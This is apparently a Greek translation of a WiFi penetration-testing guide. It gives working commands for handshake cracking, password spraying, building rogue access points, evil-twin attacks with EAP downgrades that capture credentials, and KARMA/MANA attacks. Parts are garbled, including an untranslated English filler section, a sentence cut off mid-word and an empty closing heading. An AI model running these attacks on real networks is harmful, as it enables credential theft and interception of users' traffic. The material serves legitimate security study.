Το **tshark** είναι ένα εργαλείο γραμμής εντολών που χρησιμοποιείται για την ανάλυση και την επεξεργασία πακέτων δικτύου. Είναι ένα από τα πιο ισχυρά εργαλεία για την ανίχνευση και την ανάλυση πακέτων Wi-Fi. Μπορεί να χρησιμοποιηθεί για την καταγραφή και την ανάλυση της κίνησης σε ένα ασύρματο δίκτυο, καθώς και για την εξαγωγή πληροφοριών όπως διευθύνσεις MAC, διευθύνσεις IP, πρωτόκολλα και περιεχόμενο πακέτων.

Για να χρησιμοποιήσετε το **tshark**, απλά εκτελέστε την εντολή `tshark` ακολουθούμενη από τις επιλογές και τα φίλτρα που θέλετε να εφαρμόσετε. Μπορείτε να χρησιμοποιήσετε το **tshark** για να αναλύσετε πακέτα από ένα αρχείο καταγραφής ή για να παρακολουθήσετε σε πραγματικό χρόνο την κίνηση σε ένα ασύρματο δίκτυο.

Το **tshark** παρέχει πολλές επιλογές και φίλτρα για την ανάλυση πακέτων Wi-Fi, συμπεριλαμβανομένων των φίλτρων για την ανίχνευση συγκεκριμένων διευθύνσεων MAC, την ανίχνευση συγκεκριμένων πρωτοκόλλων και την εξαγωγή πληροφοριών για την κρυπτογραφία και την ασφάλεια του δικτύου.

Το **tshark** είναι ένα απαραίτητο εργαλείο για κάθε επαγγελματία πεντεστέρ και χάκερ που ασχολείται με την ανάλυση και την επίθεση σε ασύρματα δίκτυα. Με τη βοήθεια του **tshark**, μπορείτε να ανακαλύψετε ευπάθειες και να εκμεταλλευτείτε τις αδυναμίες των ασύρματων δικτύων για να αποκτήσετε πρόσβαση σε ασφαλισμένες πληροφορίες.
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Εάν αυτό το εργαλείο βρει έναν μη ολοκληρωμένο handshake ενός ESSID πριν τον ολοκληρωμένο, δεν θα ανιχνεύσει τον έγκυρο._ 

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Σε **εγκαταστάσεις WiFi επιχειρήσεων, θα συναντήσετε διάφορες μεθόδους πιστοποίησης**, καθεμία παρέχοντας διαφορετικά επίπεδα ασφάλειας και δυνατότητες διαχείρισης. Όταν χρησιμοποιείτε εργαλεία όπως το `airodump-ng` για να επιθεωρήσετε την κίνηση του δικτύου, μπορεί να παρατηρήσετε αναγνωριστικά για αυτούς τους τύπους πιστοποίησης. Ορισμένες κοινές μεθόδοι περιλαμβάνουν:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Γενική Κάρτα Διακριτικού)**:
- Αυτή η μέθοδος υποστηρίζει υλικά διακριτικά και μονοφορετικούς κωδικούς πρόσβασης μέσω EAP-PEAP. Αντίθετα από το MSCHAPv2, δεν χρησιμοποιεί πρόκληση από τον χρήστη και αποστέλλει τους κωδικούς πρόσβασης σε καθαρό κείμενο στο σημείο πρόσβασης, προκαλώντας έναν κίνδυνο για επιθέσεις υποβάθμισης.

2. **EAP-MD5 (Message Digest 5)**:
- Περιλαμβάνει την αποστολή του κατακερματισμένου MD5 του κωδικού πρόσβασης από τον πελάτη. Δεν συνιστάται λόγω της ευπάθειας σε επιθέσεις λεξικού, της έλλειψης πιστοποίησης του διακομιστή και της αδυναμίας δημιουργίας κλειδιών WEP που είναι ειδικά για τη συνεδρία.

3. **EAP-TLS (Πρωτόκολλο Ασφάλειας Επιπέδου Μεταφοράς)**:
- Χρησιμοποιεί τόσο πιστοποιητικά πελάτη όσο και πιστοποιητικά διακομιστή για την πιστοποίηση και μπορεί να δημιουργήσει δυναμικά κλειδιά WEP βάσει χρήστη και συνεδρίας για την ασφάλεια των επικοινωνιών.

4. **EAP-TTLS (Πρωτόκολλο Ασφάλειας Επιπέδου Μεταφοράς με Σήραγγα)**:
- Παρέχει αμοιβαία πιστοποίηση μέσω μιας κρυπτογραφημένης σήραγγας, μαζί με μια μέθοδο για την παραγωγή δυναμικών, ανά χρήστη, ανά συνεδρία κλειδιών WEP. Απαιτεί μόνο πιστοποιητικά διακομιστή, με τους πελάτες να χρησιμοποιούν διαπιστευτήρια.

5. **PEAP (Προστατευμένο Επεκτάσιμο Πρωτόκολλο Πιστοποίησης)**:
- Λειτουργεί παρόμοια με το EAP δημιουργώντας έναν τούνελ TLS για προστατευμένη επικοινωνία. Επιτρέπει τη χρήση ασθενέστερων πρωτοκόλλων πιστοποίησης πάνω από το EAP λόγω της προστασίας που προσφέρει ο τούνελ.
* **PEAP-MSCHAPv2**: Συχνά αναφέρεται ως PEAP, συνδυάζει το ευάλωτο μηχανισμό πρόκλησης/απόκρισης MSCHAPv2 με έναν προστατευτικό τούνελ TLS.
* **PEAP-EAP-TLS (ή PEAP-TLS)**: Παρόμοιο με το EAP-TLS, αλλά ξεκινά έναν τούνελ TLS πριν από την ανταλλαγή πιστοποιητικών, προσφέροντας ένα επιπλέον επίπεδο ασφάλειας.

Μπορείτε να βρείτε περισσότερες πληροφορίες για αυτές τις μεθόδους πιστοποίησης [εδώ](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) και [εδώ](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Καταγραφή Ονομάτων Χρηστών

Αναγνωρίζοντας [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27), φαίνεται ότι αν χρησιμοποιείτε το **EAP**, τα μηνύματα **"Ταυτότητα"** πρέπει να είναι **υποστηριζόμενα**, και το **όνομα χρήστη** θα αποσταλεί σε **καθαρή μορφή** στα μηνύματα **"Απόκριση Ταυτότητας"**.

Ακόμα και χρησιμοποιώντας μία από τις πιο ασφαλείς μεθόδους πιστοποίησης: **PEAP-EAP-TLS**, είναι δυνατόν να **καταγραφεί το όνομα χρήστη που αποστέλλεται στο πρωτόκολλο EAP**. Για να το κάνετε αυτό, **καταγράψτε μια επικοινωνία πιστοποίησης** (ξεκινήστε το `airodump-ng` σε ένα κανάλι και το `wireshark` στην ίδια διεπαφή) και φιλτράρετε τα πακέτα με τη λέξη-κλειδί `eapol`.\
Μέσα στο πακέτο "**Απόκριση, Ταυτότητα**", θα εμφανιστεί το **όνομα χρήστη** του πελάτη.

![](<../../.gitbook/assets/image (150).png>)

### Ανώνυμες Ταυτότητες

Η απόκρυψη ταυτότητας υποστηρίζεται τόσο από το EAP-PEAP όσο και από το EAP-TTLS. Στο πλαίσιο ενός ασύρματου δικτύου, ένα αίτημα EAP-Identity συνήθως προκαλείται από το σημείο πρόσβασης (AP) κατά τη δια
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Μπορείτε επίσης να εκτελέσετε αυτήν την επίθεση χρησιμοποιώντας το `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Θεωρία επιθέσεων σε πελάτες

### Επιλογή δικτύου και αλλαγή θέσης

- Το πρωτόκολλο 802.11 καθορίζει πώς ένας σταθμός εντάσσεται σε ένα Εκτεταμένο Σύνολο Υπηρεσιών (ESS), αλλά δεν καθορίζει τα κριτήρια για την επιλογή ενός ESS ή ενός σημείου πρόσβασης (AP) μέσα σε αυτό.
- Οι σταθμοί μπορούν να μετακινούνται μεταξύ των AP που μοιράζονται το ίδιο ESSID, διατηρώντας τη συνδεσιμότητα σε ένα κτίριο ή μια περιοχή.
- Το πρωτόκολλο απαιτεί πιστοποίηση του σταθμού στο ESS, αλλά δεν απαιτεί πιστοποίηση του AP στον σταθμό.

### Λίστες προτιμώμενων δικτύων (PNLs)

- Οι σταθμοί αποθηκεύουν το ESSID κάθε ασύρματου δικτύου στο οποίο συνδέονται στην Λίστα Προτιμώμενων Δικτύων (PNL) τους, μαζί με λεπτομέρειες σχετικά με τη διαμόρφωση του συγκεκριμένου δικτύου.
- Η PNL χρησιμοποιείται για να συνδεθεί αυτόματα σε γνωστά δίκτυα, βελτιώνοντας την εμπειρία του χρήστη με την απλοποίηση της διαδικασίας σύνδεσης.

### Παθητική σάρωση

- Τα AP περιοδικά εκπέμπουν πλαίσια beacon, ανακοινώνοντας την παρουσία και τα χαρακτηριστικά τους, συμπεριλαμβανομένου του ESSID του AP εκτός εάν η εκπομπή είναι απενεργοποιημένη.
- Κατά την παθητική σάρωση, οι σταθμοί ακούν για πλαίσια beacon. Εάν το ESSID ενός beacon ταιριάζει με μια καταχώρηση στην PNL του σταθμού, ο σταθμός μπορεί να συνδεθεί αυτόματα σε αυτό το AP.
- Η γνώση της PNL ενός συσκευής επιτρέπει την πιθανή εκμετάλλευση με την προσομοίωση του ESSID ενός γνωστού δικτύου, παραπλανώντας τη συσκευή να συνδεθεί σε έναν παραπλανητικό AP.

### Ενεργή ανίχνευση

- Η ενεργή ανίχνευση περιλαμβάνει την αποστολή αιτημάτων ανίχνευσης από τους σταθμούς για την εντοπισμό κοντινών AP και των χαρακτηριστικών τους.
- Τα αιτήματα ανίχνευσης που στέλνονται σε συγκεκριμένο ESSID βοηθούν στον εντοπισμό εάν ένα συγκεκριμένο δίκτυο είναι εντός εμβέλειας, ακόμα και αν είναι ένα κρυφό δίκτυο.
- Τα αιτήματα ανίχνευσης που αποστέλλονται σε όλα τα κοντινά AP έχουν ένα πεδίο SSID μηδέν και επιτρέπουν στον σταθμό να ελέγξει για οποιοδήποτε προτιμώμενο δίκτυο χωρίς να αποκαλύπτει το περιεχόμενο της PNL του.

## Απλό AP με ανακατεύθυνση στο Διαδίκτυο

Πριν εξηγήσουμε πώς να πραγματοποιήσουμε πιο πολύπλοκες επιθέσεις, θα εξηγηθεί **πώς** απλά να **δημιουργήσετε** ένα **AP** και να **ανακατευθύνετε** την **κίνησή** του προς μια διεπαφή που είναι συνδεδεμένη **στο** **Διαδίκτυο**.

Χρησιμοποιώντας την εντολή `ifconfig -a`, ελέγξτε ότι η ασύρματη διεπαφή wlan για τη δημιουργία του AP και η διεπαφή που είναι συνδεδεμένη στο Διαδίκτυο είναι παρόντες.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Δημιουργήστε το αρχείο διαμόρφωσης `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Στη συνέχεια, **ορίστε τις διευθύνσεις IP** και **τις διαδρομές**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Και στη συνέχεια **ξεκινήστε** το dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd

Το **hostapd** είναι ένα πρόγραμμα που χρησιμοποιείται για να δημιουργήσει ένα σημείο πρόσβασης Wi-Fi (Access Point) σε έναν υπολογιστή. Αυτό το εργαλείο επιτρέπει στους χρήστες να μοιράζονται τη σύνδεσή τους στο διαδίκτυο μέσω Wi-Fi με άλλες συσκευές.

Για να χρησιμοποιήσετε το **hostapd**, πρέπει να διαμορφώσετε ένα αρχείο ρυθμίσεων, το οποίο περιέχει πληροφορίες για το όνομα του δικτύου, τον τύπο κρυπτογράφησης και άλλες παραμέτρους. Μετά τη διαμόρφωση, μπορείτε να εκκινήσετε το **hostapd** και να ξεκινήσετε να παρέχετε σύνδεση Wi-Fi σε άλλες συσκευές.

Το **hostapd** είναι ένα ισχυρό εργαλείο για την εξερεύνηση και την αξιοποίηση ευπάθειών σε δίκτυα Wi-Fi. Μπορεί να χρησιμοποιηθεί για την εκτέλεση επιθέσεων όπως η αποκρυπτογράφηση κίνησης Wi-Fi, η επίθεση στο πρωτόκολλο WPA/WPA2 και η καταστροφή του δικτύου Wi-Fi. Επίσης, μπορεί να χρησιμοποιηθεί για την ανάλυση και την παρακολούθηση της κίνησης Wi-Fi σε ένα δίκτυο.
```bash
apt-get install hostapd
```
Δημιουργήστε ένα αρχείο διαμόρφωσης `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Διακόψτε ενοχλητικές διεργασίες**, ορίστε **λειτουργία παρακολούθησης** και **ξεκινήστε τον hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Προώθηση και Ανακατεύθυνση

Forwarding and redirection are techniques used in networking to redirect traffic from one network location to another. These techniques can be useful in various scenarios, including pentesting WiFi networks.

#### Port Forwarding

Port forwarding is a technique used to redirect traffic from a specific port on a router or firewall to a different port on a different device within the network. This can be useful when conducting a pentest on a WiFi network, as it allows you to redirect traffic from a specific port to a device that you have control over.

To perform port forwarding, you need to access the router or firewall settings and configure the appropriate rules. This can usually be done through the router's web interface or command line interface (CLI). Once the port forwarding rules are set up, any traffic that arrives at the specified port will be automatically redirected to the designated device.

#### DNS Redirection

DNS redirection is a technique used to redirect DNS queries from one domain to another. This can be useful in a pentest scenario when you want to redirect traffic from a specific domain to a different IP address that you control.

To perform DNS redirection, you need to have control over the DNS server or have the ability to modify the DNS records for the domain in question. By modifying the DNS records, you can redirect traffic from the target domain to a different IP address of your choosing.

DNS redirection can be achieved by modifying the DNS records manually or by using tools and scripts that automate the process. It is important to note that DNS changes may take some time to propagate, so it may not take effect immediately.

#### URL Redirection

URL redirection is a technique used to redirect traffic from one URL to another. This can be useful in a pentest scenario when you want to redirect traffic from a specific URL to a different location that you control.

URL redirection can be achieved by modifying the web server configuration or by using server-side scripting languages such as PHP. By configuring the appropriate rules, you can redirect traffic from the target URL to a different URL of your choosing.

It is important to note that URL redirection can be temporary or permanent. Temporary redirection (HTTP status code 302) indicates that the redirection is temporary and the original URL may be accessible again in the future. Permanent redirection (HTTP status code 301) indicates that the redirection is permanent and the original URL should no longer be used.

#### Conclusion

Forwarding and redirection techniques can be powerful tools in a pentest scenario, allowing you to redirect traffic to devices or locations that you control. By understanding and utilizing these techniques, you can enhance your ability to assess and exploit WiFi networks effectively.
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Κακόβουλος Δίδυμος

Η επίθεση του κακόβουλου διδύμου εκμεταλλεύεται τον τρόπο με τον οποίο οι πελάτες WiFi αναγνωρίζουν τα δίκτυα, βασιζόμενοι κυρίως στο όνομα του δικτύου (ESSID) χωρίς να απαιτείται η πιστοποίηση του σταθμού βάσης (σημείο πρόσβασης) στον πελάτη. Τα κύρια σημεία περιλαμβάνουν:

- **Δυσκολία στη Διάκριση**: Οι συσκευές δυσκολεύονται να διακρίνουν ανάμεσα σε νόμιμα και παραπλανητικά σημεία πρόσβασης όταν μοιράζονται το ίδιο ESSID και τον ίδιο τύπο κρυπτογράφησης. Τα πραγματικά δίκτυα συνήθως χρησιμοποιούν πολλά σημεία πρόσβασης με το ίδιο ESSID για να επεκτείνουν απρόσκοπτα την κάλυψη.

- **Αλλαγή Πελάτη και Ελέγχου Σύνδεσης**: Ο πρωτόκολλο 802.11 επιτρέπει στις συσκευές να μετακινούνται μεταξύ σημείων πρόσβασης εντός του ίδιου ESS. Οι επιτιθέμενοι μπορούν να εκμεταλλευτούν αυτό προσελκύοντας μια συσκευή να αποσυνδεθεί από το τρέχον σημείο βάσης και να συνδεθεί σε ένα παραπλανητικό. Αυτό μπορεί να επιτευχθεί προσφέροντας ένα ισχυρότερο σήμα ή διαταράσσοντας τη σύνδεση με το νόμιμο σημείο πρόσβασης μέσω μεθόδων όπως πακέτα αποσύνδεσης ή ανακούφιση.

- **Προκλήσεις στην Εκτέλεση**: Η επιτυχής εκτέλεση μιας επίθεσης κακόβουλου διδύμου σε περιβάλλοντα με πολλά, καλά τοποθετημένα σημεία πρόσβασης μπορεί να είναι προκλητική. Η αποσύνδεση ενός μόνο νόμιμου σημείου πρόσβασης συνήθως έχει ως αποτέλεσμα τη σύνδεση της συσκευής σε ένα άλλο νόμιμο σημείο πρόσβασης, εκτός αν ο επιτιθέμενος μπορεί να αποσυνδέσει όλα τα κοντινά σημεία πρόσβασης ή να τοποθετήσει στρατηγικά το παραπλανητικό σημείο πρόσβασης.

Μπορείτε να δημιουργήσετε έναν πολύ απλό Ανοιχτό Κακόβουλο Δίδυμο (χωρίς δυνατότητα δρομολόγησης κίνησης προς το Διαδίκτυο) κάνοντας:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Μπορείτε επίσης να δημιουργήσετε έναν Κακό Δίδυμο χρησιμοποιώντας το **eaphammer** (προσέξτε ότι για να δημιουργήσετε κακούς δίδυμους με το eaphammer η διεπαφή **ΔΕΝ πρέπει να είναι** σε λειτουργία **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ή χρησιμοποιώντας το Airgeddon: `Επιλογές: 5,6,7,8,9 (μέσα στο μενού επίθεσης Evil Twin).`

![](<../../.gitbook/assets/image (148).png>)

Παρακαλώ, προσέξτε ότι από προεπιλογή, αν ένα ESSID στο PNL είναι αποθηκευμένο ως προστατευμένο με WPA, η συσκευή δεν θα συνδεθεί αυτόματα σε ένα ανοιχτό κακόβουλο δίκτυο. Μπορείτε να προσπαθήσετε να κάνετε DoS στον πραγματικό AP και να ελπίζετε ότι ο χρήστης θα συνδεθεί χειροκίνητα στο ανοιχτό κακόβουλο δίκτυο σας, ή μπορείτε να κάνετε DoS στον πραγματικό AP και να χρησιμοποιήσετε ένα κακόβουλο δίκτυο WPA για να καταγράψετε το handshake (χρησιμοποιώντας αυτήν τη μέθοδο δεν θα μπορείτε να επιτρέψετε στο θύμα να συνδεθεί σε εσάς καθώς δεν γνωρίζετε το PSK, αλλά μπορείτε να καταγράψετε το handshake και να προσπαθήσετε να το αποκρυπτογραφήσετε).

_Ορισμένα λειτουργικά συστήματα και προγράμματα αντιιούστρωσης θα προειδοποιήσουν τον χρήστη ότι η σύνδεση σε ένα ανοιχτό δίκτυο είναι επικίνδυνη..._

### WPA/WPA2 Evil Twin

Μπορείτε να δημιουργήσετε ένα **Κακόβουλο Δίκτυο** χρησιμοποιώντας WPA/2 και αν οι συσκευές έχουν ρυθμιστεί να συνδέονται σε αυτό το SSID με WPA/2, θα προσπαθήσουν να συνδεθούν. Παρόλα αυτά, για να ολοκληρωθεί η 4-βηματική ανταλλαγή κλειδιών, χρειάζεστε επίσης να γνωρίζετε τον κωδικό πρόσβασης που θα χρησιμοποιήσει ο πελάτης. Αν δεν τον γνωρίζετε, η σύνδεση δεν θα ολοκληρωθεί.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Επιχειρησιακός Κακόβουλος Δίδυμος

Για να κατανοήσετε αυτές τις επιθέσεις, θα σας συνιστούσα να διαβάσετε πρώτα τη σύντομη εξήγηση για το [WPA Enterprise](./#wpa-enterprise-mgt).

**Χρήση του hostapd-wpe**

Το `hostapd-wpe` χρειάζεται ένα **αρχείο ρυθμίσεων** για να λειτουργήσει. Για να **αυτοματοποιήσετε** τη δημιουργία αυτών των ρυθμίσεων, μπορείτε να χρησιμοποιήσετε το [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (κατεβάστε το αρχείο python μέσα στον φάκελο _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Στο αρχείο ρυθμίσεων μπορείτε να επιλέξετε πολλά διάφορα πράγματα όπως το ssid, το κανάλι, τα αρχεία χρήστη, το κρυφό κλειδί, οι παράμετροι dh, η έκδοση wpa και η πιστοποίηση...

[**Χρήση του hostapd-wpe με EAP-TLS για να επιτραπεί οποιοδήποτε πιστοποιητικό στην είσοδο.**](evil-twin-eap-tls.md)

**Χρήση του EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Από προεπιλογή, το EAPHammer προσφέρει αυτές τις μεθόδους πιστοποίησης (παρατηρήστε το GTC ως το πρώτο που δοκιμάζεται για να αποκτηθούν καθαρά κείμενα κωδικούς πρόσβασης και στη συνέχεια η χρήση πιο αξιόπιστων μεθόδων πιστοποίησης):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Αυτή είναι η προεπιλεγμένη μεθοδολογία για να αποφευχθούν μακροχρόνιες συνδέσεις. Ωστόσο, μπορείτε επίσης να καθορίσετε στον διακομιστή τις μεθόδους πιστοποίησης από την αδύναμη στην ισχυρότερη:
```
--negotiate weakest
```
Ή μπορείτε επίσης να χρησιμοποιήσετε:

* `--negotiate gtc-downgrade` για να χρησιμοποιήσετε μια υψηλά αποδοτική υλοποίηση υποβάθμισης GTC (κείμενο κωδικού πρόσβασης)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` για να καθορίσετε χειροκίνητα τις προσφερόμενες μεθόδους (προσφέροντας τις ίδιες μεθόδους πιστοποίησης με την ίδια σειρά με τον οργανισμό, η επίθεση θα είναι πολύ πιο δύσκολο να ανιχνευθεί).
* [Βρείτε περισσότερες πληροφορίες στο wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Χρησιμοποιώντας το Airgeddon**

Το `Airgeddon` μπορεί να χρησιμοποιήσει προηγουμένως δημιουργημένα πιστοποιητικά για να προσφέρει πιστοποίηση EAP σε δίκτυα WPA/WPA2-Enterprise. Το πλαστό δίκτυο θα υποβαθμίσει το πρωτόκολλο σύνδεσης σε EAP-MD5, έτσι ώστε να είναι σε θέση να **καταγράψει τον χρήστη και το MD5 του κωδικού πρόσβασης**. Αργότερα, ο επιτιθέμενος μπορεί να προσπαθήσει να αποκρυπτογραφήσει τον κωδικό πρόσβασης.\
Το `Airgeddon` σας προσφέρει τη δυνατότητα μιας **συνεχούς επίθεσης Evil Twin (θορυβώδους)** ή **μόνο να δημιουργήσετε την επίθεση Evil μέχρι να συνδεθεί κάποιος (αθόρυβη).**

![](<../../.gitbook/assets/image (129).png>)

### Αποσφαλμάτωση των τούνελ TLS PEAP και EAP-TTLS σε επιθέσεις Evil Twins

_Αυτή η μέθοδος δοκιμάστηκε σε μια σύνδεση PEAP, αλλά καθώς αποκρυπτογραφώ έναν αυθαίρετο τούνελ TLS, αυτό θα πρέπει να λειτουργεί και με το EAP-TTLS_

Μέσα στη **διαμόρφωση** του _hostapd-wpe_ **σχολιάστε** τη γραμμή που περιέχει το _**dh\_file**_ (από `dh_file=/etc/hostapd-wpe/certs/dh` σε `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Αυτό θα κάνει το `hostapd-wpe` να **ανταλλάσσει κλειδιά χρησιμοποιώντας RSA** αντί για DH, έτσι ώστε να μπορείτε να **αποκρυπτογραφήσετε** την κίνηση αργότερα **γνωρίζοντας το ιδιωτικό κλειδί του διακομιστή**.

Τώρα ξεκινήστε το **Evil Twin** χρησιμοποιώντας το **`hostapd-wpe`** με αυτήν την τροποποιημένη διαμόρφωση όπως συνήθως. Επίσης, ξεκινήστε το **`wireshark`** στην **διεπαφή** που εκτελεί την επίθεση Evil Twin.

Τώρα ή αργότερα (όταν έχετε ήδη καταγράψει μερικές προσπάθειες πιστοποίησης) μπορείτε να προσθέσετε το ιδιωτικό κλειδί RSA στο wireshark στο: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Προσθέστε μια νέα καταχώρηση και συμπληρώστε τη φόρμα με αυτές τις τιμές: **Διεύθυνση IP = οποιαδήποτε** -- **Θύρα = 0** -- **Πρωτόκολλο = δεδομένα** -- **Αρχείο Κλειδιού** (**επιλέξτε το αρχείο κλειδιού σας**, για να αποφύγετε προβλήματα επιλέξτε ένα αρχείο κλειδιού **χωρίς προστασία με κωδικό πρόσβασης**).

![](<../../.gitbook/assets/image (151).png>)

Και κοιτάξτε τη νέα καρτέλα **"Decrypted TLS"**:

![](<../../.gitbook/assets/image (152).png>)

## Επίθεση KARMA, MANA, Loud MANA και γνωστά beacons

### Λίστες μαύρων/λευκών ESSID και MAC

Διάφοροι τύποι Λιστών Φίλτρου Ελέγχου Πρόσβασης Μέσω Ελέγχου Πρόσβασης Μέσω Ελέγχου Πρόσβασης (MFACLs) και οι αντίστοιχοι τρόποι και επιπτώσεις στη συμπεριφορά ενός παραπλανητικού Σημείου Πρόσβασης (AP):

1. **Λευκή λίστα βάσει MAC**:
- Το παραπλανητικό AP θα ανταποκρίνεται μόνο σε αιτήματα ανίχνευσης από συσκευές που έχουν καθοριστεί στη λευκή λίστα, παραμένοντας αόρατο για όλες τις άλλες που δεν είναι καταχωρημένες.

2. **Μαύρη λίστα βάσει MAC**:
- Το παραπλανητικό AP θα αγνοεί τα αιτήματα ανίχνευσης από συσκευές που βρίσκονται στη μαύρη λίστα, καθιστώντας το παραπλανητικό AP αόρατο για αυτές τις συγκεκριμένες συσκευές.

3. **Λευκή λίστα βάσει ESSID**:
- Το παραπλανητικό AP θα ανταποκρίνεται μόνο σε αιτήματα ανίχνευσης για συγκεκριμένα ESSID που αναφέρονται, καθιστώντας το αόρατο για συσκευές που η Λίστα Προτιμώμενων Δικτύων (PNLs) τους δεν περιέχει αυτά τα ESSID.

4. **Μαύρη λίστα βάσει ESSID**:
- Το παραπλανητικό AP δεν θα ανταποκρίνεται σε αιτήματα ανίχνευσης για τα συγκεκριμένα ESSID που βρίσκονται στη μαύρη λίστα, καθιστώντας το αόρατο για συσκευές που αναζητούν αυτά τα συγκεκριμένα δίκτυα.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Αυτή η μέθοδος επιτρέπει σε έναν **επιτιθέμενο να δημιουργήσει ένα κακόβουλο σημείο πρόσβασης (AP) που απαντά σε όλα τα αιτήματα ανίχνευσης** από συσκευές που αναζητούν να συνδεθούν σε δίκτυα. Αυτή η τεχνική **απατά τις συσκευές να συνδεθούν στο AP του επιτιθέμενου** προσποιούμενο τα δίκτυα που αναζητούν οι συσκευές. Μόλις μια συσκευή στείλει ένα αίτημα σύνδεσης σε αυτό το πλαστό AP, ολοκληρώνεται η σύνδεση, οδηγώντας τη συσκευή να συνδεθεί κατά λάθος στο δίκτυο του επιτιθέμενου.

### MANA

Στη συνέχεια, **οι συσκευές άρχισαν να αγνοούν τις μη αιτηθείσες απαντήσεις δικτύου**, μειώνοντας την αποτελεσματικότητα της αρχικής επίθεσης karma. Ωστόσο, μια νέα μέθοδος, γνωστή ως **επίθεση MANA**, παρουσιάστηκε από τον Ian de Villiers και τον Dominic White. Αυτή η μέθοδος περιλαμβάνει το κακόβουλο AP **να καταγράφει τις Λίστες Προτιμώμενων Δικτύων (PNL) από τις συσκευές απαντώντας στα αιτήματα ανίχνευσης που εκπέμπουν** με ονόματα δικτύων (SSIDs) που προηγουμένως έχουν ζητηθεί από τις συσκευές. Αυτή η εξεζητημένη επίθεση παρακάμπτει τις προστασίες κατά της αρχικής επίθεσης karma εκμεταλλευόμενη τον τρόπο με τον οποίο οι συσκευές θυμούνται και δίνουν προτεραιότητα σε γνωστά δίκτυα.

Η επίθεση MANA λειτουργεί παρακολουθώντας τόσο τα κατευθυνόμενα όσο και τα ευρυεκπεμπόμενα αιτήματα ανίχνευσης από τις συσκευές. Για τα κατευθυνόμενα αιτήματα, καταγράφει τη διεύθυνση MAC της συσκευής και το όνομα του δικτύου που ζητήθηκε, προσθέτοντας αυτές τις πληροφορίες σε μια λίστα. Όταν λαμβάνεται ένα ευρυεκπεμπόμενο αίτημα, το AP απαντά με πληροφορίες που ταιριάζουν με οποιοδήποτε από τα δίκτυα στη λίστα της συσκευής, προσελκύοντας τη συσκευή να συνδεθεί στο κακόβουλο AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Δυνατή επίθεση MANA

